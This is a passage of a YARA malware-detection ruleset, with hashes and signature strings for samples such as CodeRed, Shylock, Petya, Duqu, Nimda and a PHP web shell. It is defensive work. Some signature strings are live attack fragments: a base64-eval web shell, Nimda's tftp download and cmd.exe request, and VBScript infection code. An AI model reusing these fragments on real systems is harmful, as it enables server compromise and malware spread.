      $s10 = "h0kA8vL1w78oXli8W2" fullword ascii
      $s11 = "untimeResourceSet" fullword ascii
      $s12 = "EI0n4pWWhhMtToLsac" fullword ascii
      $s13 = "RmGnR1aFpWh2ZqBB9a" fullword ascii
      $s14 = "DUDO17BWSp7EQFUURw" fullword ascii
      $s15 = "nbNcTBIhGd3eSQt9Cb" fullword ascii
      $s16 = "LdnAaYZlQ4fpOFI4AA" fullword ascii
      $s17 = "PDuPCEwogASkLgVkGL" fullword ascii
      $s18 = "dl4a6uOuTFiRbbCEKC" fullword ascii
      $s19 = "dY6XlRfCPE55IrFp1Q" fullword ascii
      $s20 = "dCOkMdniu9J2Olra2V" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      any of them
}

rule trojanDestover_bgyp {
   meta:
      filename = "MAL - file signed.exe"
      hash1 = "4c2efe2f1253b94f16a1cab032f36c7883e4f6c8d9fc17d0ee553b5afb16330c"
   strings:
      $s1 = "igfxtpers.exe" fullword wide
      $s2 = "www.amazon.com" fullword ascii
      $s3 = "MessageThread" fullword wide
      $s4 = "Re.gOp..en  KeyE.xW" fullword ascii
      $s5 = "..Get.  Logi...calD  .rives" fullword ascii
      $s6 = " Wa.itF orSi.ng.leO.bje . ct" fullword ascii
      $s7 = "Ge tT.e mpFi. l.eNa . meW" fullword ascii
      $s8 = ".Ge.tMo d.u leHa n dleW" fullword ascii
      $s9 = "GetD. iskFr. .eeSp..ace E  xW" fullword ascii
      $s10 = "Writ. eProce . ssMem.ory" fullword ascii
      $s11 = "Get.Ver..sio nExW" fullword ascii
      $s12 = "Mov.eFi . leW" fullword ascii
      $s13 = "GetPr..oce s. sTim. es.." fullword ascii
      $s14 = "Compute Cluster " fullword wide
      $s15 = "%d %s \\ %s: " fullword wide
      $s16 = "Ge .tE xit Cod . eTh .read" fullword ascii
      $s17 = "208.105.226.235" fullword wide
      $s18 = "203.131.222.102" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      any of them
}

rule trojanMeinhudong_nsis {
   meta:
      filename = "MAL - file 798_abroad.exe"
      hash1 = "2fd5b075ab9dffe8b421a4942ecdac322d8f0fceca597a644a6a9e631901e8bc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><filename>" ascii
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAss" ascii
      $s4 = " Install System v2.45</filename><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii
      $s5 = "https://www.thawte.com/cps0" fullword ascii
      $s6 = "3:[_)\\@F{" fullword ascii
      $s7 = "LFEBRPKO" fullword ascii
      $s8 = "neyE(/" fullword ascii
      $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $s10 = "PEye>`" fullword ascii
      $s11 = " -#6od" fullword ascii
      $s12 = " /br8m" fullword ascii
      $s13 = "Beijing1" fullword ascii
      $s14 = "- IM4-" fullword ascii
      $s15 = "r7) /v8" fullword ascii
      $s16 = "xslakq" fullword ascii
      $s17 = "amja904" fullword ascii
      $s18 = "7SQ -%" fullword ascii
      $s19 = "&* ,Dqs" fullword ascii
      $s20 = "QLnKQz0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule CodeRed_Worm_C {
   meta:
      filename = "MAL - file CodeRed.Worm_C.EXE"
      hash1 = "aedf60c10f8cc74d70eee2e70515ebac57932ac99619493ebb9f8bb29382fad3"
   strings:
      $s1 = "hotfix.exe" fullword ascii
      $s2 = "*http://www.microsoft.com/technet/security 0" fullword ascii
      $s3 = "symbols\\dll\\idq.pdb" fullword ascii
      $s4 = "WWWWSW" fullword ascii
      $s5 = "6http://crl.microsoft.com/msprod/windows/windowspca.crl0" fullword ascii
      $s6 = "symbols\\dll\\idq.dbg" fullword ascii
      $s7 = "hotfix.inf" fullword ascii
      $s8 = "pWindows NT 4.0 Hotfix [See Q300972 for more information" fullword wide
      $s9 = "\"Copyright (c) 2000 Microsoft Corp.1)0'" fullword ascii
      $s10 = "applet0" fullword ascii
      $s11 = "R2eVwWTe3C" fullword ascii
      $s12 = "] )TaIS>/I" fullword ascii
      $s13 = "QqqJ%b+5f" fullword ascii
      $s14 = " Microsoft Windows 2000 Publisher0" fullword ascii
      $s15 = "'2MINt;/F" fullword ascii
      $s16 = "rya`$Z.Bnr&d" fullword ascii
      $s17 = "idq.dll" fullword ascii 
      $s18 = "DYMFRar)" fullword ascii
      $s19 = "8tSZg$ghTR[" fullword ascii
      $s20 = "HtuHtMHt" fullword ascii 
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule Shylock_skype_trojan {
   meta:
      filename = "MAL - file Shylock-skype_trojan"
      hash1 = "4bd97130a89c2f9080259d8e87d8d713a23fd0e4336eabb0bf47a44d700ec842"
   strings:
      $s1 = "mspreadmutex" fullword ascii
      $s2 = "MsgSpread: Skype-server error - options." fullword ascii
      $s3 = "MsgSpread: Cannot download loader." fullword ascii
      $s4 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705)" fullword wide
      $s5 = "THomeForm" fullword wide 
      $s6 = "ASTCOLUMNCOMMITCONFLICTCROSSCURRENT_TIMESTAMPRIMARYDEFERREDISTINCTDROPFAILFROMFULLGLOBYIFISNULLORDERESTRICTOUTERIGHTROLLBACKROWU" ascii
      $s7 = "GET CURRENTUSERHANDLE" fullword ascii
      $s8 = "GET MESSAGE %S PARTNER_DISPNAME" fullword ascii
      $s9 = "\\Skype\\%s\\main.db" fullword wide
      $s10 = "MsgSpread: Full history FAIL." fullword ascii
      $s11 = "Fragmented space is %d byte reported as %d on page %d" fullword ascii
      $s12 = "MsgSpread: Sound FAIL." fullword ascii
      $s13 = "MsgSpread: DB history FAIL." fullword ascii
      $s14 = "user=%s|%s|%s&fnames=" fullword wide
      $s15 = "session=%s&user=%s&fids=" fullword wide
      $s16 = "INTERSECTRIGGEREFERENCESCONSTRAINTOFFSETEMPORARYUNIQUERYATTACHAVINGROUPDATEBEGINNERELEASEBETWEENOTNULLIKECASCADELETECASECOLLATEC" ascii
      $s17 = "Corruption detected in header on page %d" fullword ascii
      $s18 = "SkpWnd" fullword ascii
      $s19 = "SkypeControlAPIDiscover" fullword ascii
      $s20 = "@&dfile is encrypted or is not a database" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule TrojanRansom_petya {
   meta:
      filename = "MAL - file TrojanRansom_petya"
      hash1 = "eefa052da01c3faa1d1f516ddfefa8ceb8a5185bb9b5368142ffdf839aea4506"
   strings:
      $x1 = "sqloledb.dll" fullword wide 
      $s2 = "mdmui.dll" fullword wide
      $s3 = "cpde.dll" fullword wide
      $s4 = "I:\\VS70Builds\\3077\\vsbuilt\\retail\\Bin\\i386\\opt\\mdm.pdb" fullword ascii
      $s5 = "\\bin\\mscordmp.exe" fullword wide
      $s6 = "%s\\dbghelp.dll" fullword ascii
      $s7 = "mdm.exe" fullword wide
      $s8 = "ForceRemove '%CLSID_PrivateScriptJITProvider%' = s '%MDMSessProvName%'" fullword ascii
      $s9 = "An exception occurred. Process will be terminated." fullword wide
      $s10 = "vs7jit.exe.config" fullword ascii
      $s11 = "/dumpjit: display current JIT (just-in-time) debugging settings" fullword wide
      $s12 = "Debugger Users are non administrators who are allowed to use Visual Studio to debug processes, both locally and remotely. Only t" wide
      $s13 = "An error occurred while the debugger attempted to correct its registry." fullword wide
      $s14 = "Just-In-Time DebuggingYHowever, no debuggers are registered that can debug this exception.  Unable to JIT debug.]However, a debu" wide
      $s15 = "A previous script debugger was installed, which unregistered 7.0 debugger components. The 7.0 components have been reregistered." wide
      $s16 = "+Driver '%s' doesn't support sql debugging." fullword wide
      $s17 = "zInterface\\%s\\ProxyStubClsid32" fullword ascii
      $s18 = "\"%s\" -x -s %u" fullword ascii
      $s19 = "SOFTWARE\\Microsoft\\Windows NT\\Current Version\\AeDebug" fullword ascii
      $s20 = "Debugger Users" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule trojan_powelikskovter {
   meta:
      filename = "MAL - file trojan_powelikskovter.exe"
      hash1 = "40050153dceec2c8fbb1912f8eeabe449d1e265f0c8198008be8b34e5403e731"
   strings:
      $x1 = "win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKeyToken=\"6595b64144" ascii
      $s2 = "requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivile" ascii
      $s3 = "ine_ProcessPyBDUOPCmd" fullword ascii
      $s4 = "U_CHANEXPAND_ProcessPyBDUOPCm" fullword ascii
      $s5 = "eeeeebbb" ascii
      $s6 = "eg4VideoerCtrl - RecVne_GetAudi" fullword ascii
      $s7 = "Delete Downloaded Files After Usage" fullword wide
      $s8 = "crosoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii
      $s9 = "OO:CCLDVDEngine_SetBDJKeyEven" fullword ascii
      $s10 = "CreateAllocgine_GetCommDe" fullword ascii
      $s11 = "gine_GetCommS" fullword ascii
      $s12 = "Enter Document Password" fullword wide
      $s13 = "Please enter valid user or owner password for the document:" fullword wide
      $s14 = "{BMP - Windows Bitmap}" fullword wide
      $s15 = "x||||||" fullword ascii 
      $s16 = "Content Copying:" fullword wide
      $s17 = "Content Copying for Accessibility:" fullword wide
      $s18 = "Creation of Template Pages:" fullword wide
      $s19 = "!!!###########!!!!" fullword ascii
      $s20 = "&Destination Folder for Downloads from URLs:" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule stabuniq_Trojan {
   meta:
      filename = "MAL - file stabuniq_Trojan"
      hash1 = "5a0d64cc41bb8455f38b4b31c6e69af9e7fd022b0ea9ea0c32c371def24d67fb"
   strings:
      $s1 = "rqPysEC" fullword ascii
      $s2 = "<VUSad?" fullword ascii
      $s3 = "NxwO?%" fullword ascii
      $s4 = "0xWvIB^n" fullword ascii
      $s5 = "slWIx;&8Q" fullword ascii
      $s6 = "4 4(4,44484" fullword ascii 
      $s7 = "YYh @A" fullword ascii 
      $s8 = "smet!P" fullword ascii
      $s9 = "#e.wPx" fullword ascii
      $s10 = "6#6F6z6" fullword ascii 
      $s11 = "2,2<2L2" fullword ascii 
      $s12 = "TvKtu1" fullword ascii
      $s13 = "X86OnH" fullword ascii
      $s14 = "WY<%vZ" fullword ascii
      $s15 = ";:<L<g<(=@=G=O=T=X=\\=" fullword ascii
      $s16 = "ml%lUU" fullword ascii
      $s17 = "f@EHEg" fullword ascii
      $s18 = "C^Oqj9" fullword ascii
      $s19 = "^iTRpY=" fullword ascii
      $s20 = "pOw\\xX" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule trojan_loadmoneyogimant {
   meta:
      filename = "MAL - file trojan_loadmoneyogimant.exe"
      hash1 = "3a93d0b4345900c5eddfaa574b721546312468a418f34b39bcefbbda9118b0cb"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
      $s2 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s3 = "qppppppppppppppppppppppppppppppppq" fullword ascii
      $s4 = "ntqqpjp" fullword ascii
      $s5 = "qippixqhij" fullword ascii
      $s6 = "http://mail.ru/0" fullword ascii
      $s7 = "NLLLLLLLLLLLLLLLLLLLLN" fullword ascii
      $s8 = "  Unknown pseudo relocation protocol version %d." fullword ascii
      $s9 = "ghhhfh" fullword ascii
      $s10 = "hpsm477" fullword ascii
      $s11 = "HHHHIHE65" fullword ascii
      $s12 = "HHHHHH?>" fullword ascii
      $s13 = "LLC Mail.Ru0" fullword ascii
      $s14 = "UcRIwOL-" fullword ascii
      $s15 = "MgnZJ+W" fullword ascii
      $s16 = "LLC Mail.Ru1" fullword ascii
      $s17 = "jCKk\\f" fullword ascii
      $s18 = "GCGEGAN@@" fullword ascii
      $s19 = "lIbh%j'" fullword ascii
      $s20 = "FFFHFE:" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule trojan_firseriamorstar {
   meta:
      filename = "MAL - file trojan_firseriamorstar.exe"
      hash1 = "2c7b1c5c51f6952e7b8d0ac8137bc890f0edb43f878d0e356a4bdbe1ab325127"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><dependency><dependentAssembly><assemblyIdentity ty" ascii
      $s2 = "win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicKeyToken=\"1fc8b3b9a1e18e3b\"></" ascii
      $s3 = "uestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></securit" ascii
      $s4 = "\"soporteportal2@portalprogramas.com0" fullword ascii
      $s5 = "PortalProgramas1" fullword ascii
      $s6 = "!Win32 .EXE." fullword ascii
      $s7 = "PortalProgramas0" fullword ascii
      $s8 = "trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" fullword ascii
      $s9 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><dependency><dependentAssembly><assemblyIdentity ty" ascii
      $s10 = "dentity></dependentAssembly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><r" ascii
      $s11 = "1.0.0.30" fullword wide
      $s12 = "`0:.rYH" fullword ascii
      $s13 = "u2.Eqq" fullword ascii
      $s14 = "pYwH-hy" fullword ascii
      $s15 = "ngUf<O2_m" fullword ascii
      $s16 = "mBAUx*t<78" fullword ascii
      $s17 = "9iVLCs~vJ" fullword ascii
      $s18 = "SGLC)/D271" fullword ascii
      $s19 = "fqvxj}v" fullword ascii
      $s20 = "7GxQyTJ8" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule trojan_duquwinnt {
   meta:
      filename = "MAL - file trojan_duquwinnt.exe"
      hash1 = "9d88425e266b3a74045186837fbd71de657b47d11efefcf8b3cd185a884b5306"
   strings:
      $s1 = "\\SystemRoot\\System32\\hal.dll" fullword wide
      $s2 = "nfrd965.sys" fullword wide
      $s3 = "\\DosDevices\\GpdDev" fullword wide
      $s4 = "92:B:V:\\:h:s:|:" fullword ascii
      $s5 = "RSSSSSQ" fullword ascii
      $s6 = "IBM Corporation " fullword wide
      $s7 = "4.33.0.12" fullword wide
      $s8 = "IBM ServeRAID Contoller" fullword wide
      $s9 = "SUVWhP2" fullword ascii
      $s10 = "\\Device\\Gpd1" fullword wide
      $s11 = "\\Device\\Gpd0" fullword wide
      $s12 = "l$DVWj" fullword ascii 
      $s13 = "<-<X<{<" fullword ascii 
      $s14 = "?,?I?`?" fullword ascii 
      $s15 = "7%8P8}8" fullword ascii 
      $s16 = "IBM ServeRAID Controller Driver" fullword wide 
      $s17 = "InternalCopyright" fullword wide
      $s18 = "ZwQuerySystemInformation" fullword wide
      $s19 = "t$L;t$Hw+" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      8 of them
}

rule virus_hopperinternal {
   meta:
      filename = "MAL - file virus_hopperinternal.HTM"
      hash1 = "173671beefa95df1a34493514264da0506fe533c420a0b0f9920124ce8344a44"
   strings:
      $s1 = "Private Fso, NT, HostType, InfType, HostPath, Target, NextLine, TempFile" fullword ascii
      $s2 = "fso.CopyFile Target.path, TempFile" fullword ascii
      $s3 = "if InfType = \"htm\" or InfType = \"vbs\" AND Target.path <> HostPath then" fullword ascii
      $s4 = "'HostPath = Wscript.ScriptFullName" fullword ascii
      $s5 = "HostPath = \"C:\\Windows\\Web\\Afile.htm\"" fullword ascii
      $s6 = "href=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's" fullword ascii
      $s7 = "TempFile = fso.GetTempName" fullword ascii
      $s8 = "--></script>" fullword ascii
      $s9 = "Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule" fullword ascii
      $s10 = "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule" fullword ascii
      $s11 = "Set fh = fso.opentextfile(Target.path, 1, true)" fullword ascii
      $s12 = "Set ft = fso.opentextfile(Target.path, 2, true)" fullword ascii
      $s13 = "fso.DeleteFile TempFile" fullword ascii
      $s14 = "Set ft = fso.opentextfile(Target.path, 8, true)" fullword ascii
      $s15 = "cpath = fso.GetParentFolderName(HostPath)" fullword ascii
      $s16 = "For each Target in fc" fullword ascii
      $s17 = "NT.DeleteLines 171, (NT.CountOfLines - 170)" fullword ascii
      $s18 = "<meta name=\"Author\" content=\"1nternal\">" fullword ascii
      $s19 = "Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule" fullword ascii
      $s20 = "<p align=\"center\"><strong>ActiveX.Comment v0.1</strong></p>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 10KB and
      8 of them
}

rule W32_Duni_Malware {
   meta:
      filename = "MAL - file W32_Duni_Malware.HTM"
      hash1 = "9e7cf9e074a8063b5f7a3c57a92fdfc1730ff128aeabc7bac885e8ec7fb5140c"
   strings:
      $x1 = "<HTML><HEAD><TITLE>Symantec Security Response - W32.Kitro.C.Worm</TITLE><!-- Lotus-Domino (Release 5.0.9a - January 7, 2002 on W" ascii
      $s2 = "                                href=\"http://securityresponse.symantec.com/avcenter/refa.html#Distribution\">Distribution</A>:<" ascii
      $s3 = "<!-- saved from url=(0077)http://securityresponse.symantec.com/avcenter/venc/data/w32.kitro.c.worm.html -->" fullword ascii
      $s4 = "<!-- Begin avcenter-navbar.html Template --></HEAD>" fullword ascii
      $s5 = "TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- Begin table-end.html Template --><!-- MAIN CONTENT AREA T" ascii
      $s6 = " distribution_shared_drive --><!-- distribution_target --><!-- end list --></LI></UL><!-- technical filename -->" fullword ascii
      $s7 = "<META content=\"MSHTML 6.00.2600.0\" name=GENERATOR><!-- Begin style.html Template -->" fullword ascii
      $s8 = "                          of attachment: </A>236,032 bytes <!-- distribution_attachment_stamp --><!-- distribution_ports --><!--" ascii
      $s9 = "                            \"%Windows%\\vshield.vxd\" <!-- damage_payload_modify_files --><!-- damage_payload_degrade --><!-- d" ascii
      $s10 = "ABLE ENDS HERE --></TD></TR></TBODY></TABLE><!-- End table-end.html Template --></BODY></HTML>" fullword ascii
      $s11 = "                            \"%Windows%\\vshield.vxd\" <!-- damage_payload_modify_files --><!-- damage_payload_degrade --><!-- d" ascii
      $s12 = "                        <P>Write-up by: Patrick Nolan and Frederic Perriot <BR><!-- VIRUS WRITE-UP - END --><BR></P></TD></TR></" ascii
      $s13 = "<!-- End style.html Template --><LINK " fullword ascii
      $s14 = "<!-- infection length --><BR><B><A " fullword ascii
      $s15 = "indows NT/Intel) --><!-- META CONTENT -->" fullword ascii
      $s16 = "ge_payload_instability --><!-- damage_payload_confidential --><!-- damage_payload_security -->" fullword ascii
      $s17 = "n --><!-- distribution header and start list -->" fullword ascii
      $s18 = "                          href=\"http://securityresponse.symantec.com/avcenter/refa.html#payload\">Payload: " fullword ascii
      $s19 = "                        system:<BR><BR><TT>C:\\archiv~1\\perav\\pav.dll</TT><BR><TT>C:\\archiv~1\\perav\\per.dll</TT><BR><TT>C:" ascii
      $s20 = "                            e-mail addresses it finds. <!-- damage_payload_delete_files -->" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule trojan_msil_steam {
   meta:
      filename = "MAL - file trojan.msil_steam.exe"
      hash1 = "e9cfb6eb3a77cd6ea162cf4cb131b5f6ad2a679c0ba9757d718c2f9265a9668f"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii
      $s3 = "\\System.String[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PA" fullword ascii
      $s4 = "sdddddddd.exe" fullword wide
      $s5 = "NjNQNENqN" fullword ascii
      $s6 = "System.Security.Cryptography.RijndaelManaged" fullword wide
      $s7 = "sdddddddd" fullword ascii
      $s8 = "ConfuserEx v1.0.0" fullword ascii
      $s9 = "CloperTolCompy" fullword wide
      $s10 = "NHNRNJN" fullword ascii
      $s11 = "NZNNNFN" fullword ascii
      $s12 = "NINMNBN" fullword ascii
      $s13 = "NYNSNSN" fullword ascii
      $s14 = "0.0.1.3" fullword wide
      $s15 = "0.0.1.2" fullword wide
      $s16 = "NSN%N%N" fullword ascii
      $s17 = "Microsoft.VisualBasic" fullword ascii
      $s18 = "NoNCNxNfN[N" fullword ascii
      $s19 = "yWfwD3d3JowBUMbUgRl" fullword ascii
      $s20 = "NMNnNyNjN" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule worm_nimdahllw {
   meta:
      filename = "MAL - file worm_nimdahllw.exe"
      hash1 = "ebc324308ee01698aeb02ab5de68cc7d8f9e13bd9f4d8edc7daeb438850612b9"
   strings:
      $x1 = "c:\\httpodbc.dll" fullword ascii
      $s2 = "e:\\httpodbc.dll" fullword ascii
      $s3 = "d:\\httpodbc.dll" fullword ascii
      $s4 = "tftp%%20-i%%20%s%%20GET%%20cool.dll%%20" fullword ascii
      $s5 = "/winnt/system32/cmd.exe?/c+" fullword ascii
      $s6 = "/httpodbc.dll" fullword ascii
      $s7 = "winzip32.exe" fullword ascii
      $s8 = "\\riched20.dll" fullword ascii
      $s9 = "explorer.exe load.exe -dontrunold" fullword ascii
      $s10 = "net%%20use%%20\\\\%s\\ipc$%%20\"\"%%20/user:\"guest\"" fullword ascii
      $s11 = "Image Space Exec Write Copy" fullword ascii
      $s12 = "Reserved Space Exec Write Copy" fullword ascii
      $s13 = "Exec Write Copy" fullword ascii
      $s14 = "Mapped Space Exec Write Copy" fullword ascii
      $s15 = "Image Space Exec Read/Write" fullword ascii
      $s16 = "Image Space Executable" fullword ascii
      $s17 = "Reserved Space Exec Read/Write" fullword ascii
      $s18 = "Exec Read Only" fullword ascii
      $s19 = "Reserved Space Executable" fullword ascii
      $s20 = "Mapped Space Exec Read/Write" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule trojan_sofacy_graftor {
   meta:
      filename = "MAL - file trojan.sofacy_graftor.exe"
      hash1 = "ff808d0a12676bfac88fd26f955154f8884f2bb7c534b9936510fd6296c543e8"
   strings:
      $s1 = "CreateProcessAsULookupPrivilegeVOpenProcessToken" fullword ascii
      $s2 = ".?AVUpLoader@@" fullword ascii
      $s3 = ".?AVIUpLoader@@" fullword ascii
      $s4 = " Type Descriptor'" fullword ascii
      $s5 = ":(:8:<:@:X:\\:t:" fullword ascii
      $s6 = "Aapi-ms-win-appmodel-runtime-l1-1-1" fullword wide
      $s7 = " Base Class Descriptor at (" fullword ascii
      $s8 = " Class Hierarchy Descriptor'" fullword ascii
      $s9 = " Complete Object Locator'" fullword ascii
      $s10 = "Aadvapi32" fullword wide
      $s11 = "SeTcbPrivilege" fullword wide
      $s12 = "SeSecurityPrivilege" fullword wide
      $s13 = "[n.Jsr<!" fullword ascii
      $s14 = "D:L:T:\\:d:l:t:|:" fullword ascii 
      $s15 = "URPQQh0>@" fullword ascii
      $s16 = "XjvYjaZjpf" fullword ascii
      $s17 = "jKXjeYjr[jnf" fullword ascii
      $s18 = "SVWjAXjdf" fullword ascii
      $s19 = "jAXjdYjvf" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule virus_hantanerhllp {
   meta:
      filename = "MAL - file virus_hantanerhllp.exe"
      hash1 = "ef1503f018dc86161d663071e2a7fd06eec504895334fcd692b4a17272013d60"
   strings:
      $s1 = "_setup.dll" fullword ascii
      $s2 = "_setup.dllPK" fullword ascii
      $s3 = "setup.exePK" fullword ascii
      $s4 = "archive.zPK" fullword ascii
      $s5 = "QggZ:\"" fullword ascii
      $s6 = "pdfwritr.wri" fullword ascii
      $s7 = "setup.pkg" fullword ascii
      $s8 = "llWGetLongPathNameA" fullword ascii
      $s9 = "GetCuriTh" fullword ascii
      $s10 = "oftware" fullword ascii
      $s11 = "k`aKfp -c" fullword ascii
      $s12 = "_isdel.exePK" fullword ascii
      $s13 = "_setup.lib" fullword ascii
      $s14 = "\"h~K:\\" fullword ascii
      $s15 = "eQ:\\0rk4" fullword ascii
      $s16 = "pdfwritr.wriPK" fullword ascii
      $s17 = "ZTUWVSA" fullword ascii
      $s18 = "/*anJftP" fullword ascii
      $s19 = " OBlOgR" fullword ascii
      $s20 = "J$!Ftp[" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule trojanEmotett_spy {
   meta:
      filename = "MAL - file trojanEmotett_spy.bin"
      hash1 = "6393fe8dd4721190f240e22feeb769675b6194a70cabd5a415c2364686a9089c"
   strings:
      $s1 = "NOFAstb.exe" fullword wide
      $s2 = "@*\\AC:\\Documents and Settings\\" fullword wide
      $s3 = "45545545555455" ascii 
      $s4 = "\\Remounter (2)\\Remounter\\VeladonACCOJ.vbp" fullword wide
      $s5 = "3**455555555555555555555555555554678(" fullword ascii
      $s6 = "<=7<<0?;7>5" fullword ascii
      $s7 = "7*2,5/0 3 4#:&(=" fullword ascii
      $s8 = "Goodreads" fullword wide
      $s9 = "oyjetwuxmq" fullword ascii
      $s10 = "anyjkstykuk" fullword ascii
      $s11 = "aaabaaaaaaaaaaaaaaaaaabbaaa" ascii
      $s12 = "y<<<<<<<88yyyy888888yyy88<<<<<<<<y" fullword ascii
      $s13 = "HJMNZNO" fullword ascii
      $s14 = "WWWWWWWWWWWWWWWWWWWWXXWWXYI" fullword ascii
      $s15 = "*y(+--j./1,!+ %'2<8;9?1;50<37;29" fullword ascii
      $s16 = "adot|Xs;{" fullword ascii
      $s17 = "^m[fXrW^WRT" fullword ascii
      $s18 = "NOPGHGGHHHHHHHHHHHHHHHHHHHHHHGHHHQ+RL!S" fullword ascii
      $s19 = "NOPQRGS*" fullword ascii
      $s20 = "i@a`QPaXXXG=GH" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule trojanSymmi_dircrypt {
   meta:
      filename = "MAL - file trojanSymmi_dircrypt"
      hash1 = "e908284c087983e3b9f3a3b828f1a3812bfe0e77694b9ef943c0e5c90eb747bb"
   strings:
      $s1 = "dvsd.EXE" fullword wide
      $s2 = "vsdvdsfv" fullword wide
      $s3 = "hTJ.NyC" fullword ascii
      $s4 = "N Version 1.0" fullword wide
      $s5 = "d%sd%?z" fullword ascii
      $s6 = ":AE -B" fullword ascii
      $s7 = "V /d@X" fullword ascii
      $s8 = "dsgrfd" fullword wide
      $s9 = "*&wNXs?" fullword ascii
      $s10 = "GLHMNJuE" fullword ascii
      $s11 = "KsVc44v" fullword ascii
      $s12 = "tmOGi?" fullword ascii
      $s13 = "mzLc?}" fullword ascii
      $s14 = "yyAq%Yb" fullword ascii
      $s15 = "isom3gp4" fullword ascii
      $s16 = "rXaA~?n" fullword ascii
      $s17 = " .pjH$v0" fullword ascii
      $s18 = "wOSfUfO" fullword ascii
      $s19 = "ACNJ/kSo" fullword ascii
      $s20 = ".erZt\"3.Od" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule trojan_nettool_webshell {
   meta:
      filename = "MAL - file trojan.nettool_webshell.B"
      hash1 = "6377cc547214b7fe21fc56448f959f0903c4ff8906370428426d9afe615d45be"
   strings:
      $s1 = "ea7ed9bb14a7bda590cf3ff81c8c37703a028c4fdb4599b6a283d68fdcb2613f.exe" fullword ascii
      $s2 = "483fe88d70cb09361c27468b97b7f96bd667d8c915c9f004a27d4260367d551b.exe" fullword ascii
      $s3 = "4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756<?php @eval(base64_decode($_POST['citrix@kharpedar']));?>PK" fullword ascii
      $s4 = "CdLLxH0" fullword ascii
      $s5 = "]EEeYETTDDT" fullword ascii
      $s6 = "Yfnu3* _" fullword ascii
      $s7 = "ewvvfvv" fullword ascii
      $s8 = " DvOV!." fullword ascii
      $s9 = "rJZ:\\p*Z" fullword ascii
      $s10 = "om:\"Of" fullword ascii
      $s11 = "k:\\/@i" fullword ascii
      $s12 = ",dv:\\(" fullword ascii
      $s13 = "CIA.pJZ" fullword ascii
      $s14 = "H:\"M] " fullword ascii
      $s15 = "8?z:\\k~Pdf" fullword ascii
      $s16 = "Nhf.VRe" fullword ascii
      $s17 = "NEYe_Q" fullword ascii
      $s18 = "4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756" ascii
      $s19 = "PA~`EyE" fullword ascii
